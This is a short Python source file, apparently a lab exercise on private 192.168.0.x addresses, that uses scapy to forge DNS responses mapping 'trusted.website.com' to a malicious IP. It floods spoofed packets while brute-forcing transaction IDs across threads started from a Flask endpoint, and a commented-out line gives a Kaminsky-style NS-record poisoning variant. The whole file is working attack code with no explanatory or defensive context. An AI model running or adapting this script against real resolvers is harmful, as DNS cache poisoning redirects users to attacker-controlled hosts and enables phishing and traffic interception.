from scapy.all import *
from flask import Flask, request
import threading

app = Flask(__name__)
src_ip = "192.168.0.100"
mal_ip = "192.168.0.151"
dst_ip = "192.168.0.200"

src_port = 53
dst_port = 6666

website = "trusted.website.com"
dnswebsite ="dnswebsite.website.com"

response = (IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1,
            aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=604769, rdata=mal_ip)))

# kaminsky
# response=(IP(dst=src_ip, src=dst_ip)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), ns=DNSRR(rrname=website, type='NS', ttl=604769, rdata=dnswebsite), ar=DNSRR(rrname=dnswebsite, type='A', ttl=604769, rdata="192.168.0.150")))

dns_layer = response[DNS]
s = conf.L3socket()


def attack(start):
	for i in range(start, start + 500, 1):
		dns_layer.id = i % 65000
		s.send(response)
	return 'done'


@app.route('/', methods=['GET'])
def start_attack():
	qid = int(request.args.get('start_qid'))
	for i in range(0, 20, 1):
		threading.Thread(target=attack, args=(qid,)).start()
		qid += 500
	return 'done'


if __name__ == "__main__":
	app.run(debug = True, host = '0.0.0.0', port = 8888)
